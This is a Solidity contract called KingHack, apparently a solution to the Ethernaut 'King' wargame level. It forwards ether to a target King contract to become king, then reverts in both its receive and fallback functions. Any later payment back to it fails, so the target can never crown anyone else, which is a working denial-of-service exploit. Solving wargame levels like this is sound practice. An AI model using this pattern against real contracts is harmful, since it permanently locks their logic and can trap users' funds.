// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './King.sol';
contract KingHack {

    //King public king = King(payable(address(0x7767BE305895CCfF1Ad300296705F256d42884FD)));


    receive() external payable{
      revert("lmao");
    }
    fallback() external payable{
      revert("lmao2");
    }


  function takeThrone(address king) public payable{
    //address payable kingPay = payable(address(king));
    //1000000000000000
      (bool result, bytes memory data) = king.call.value(msg.value)("");
      if(!result) revert();
  }

  



}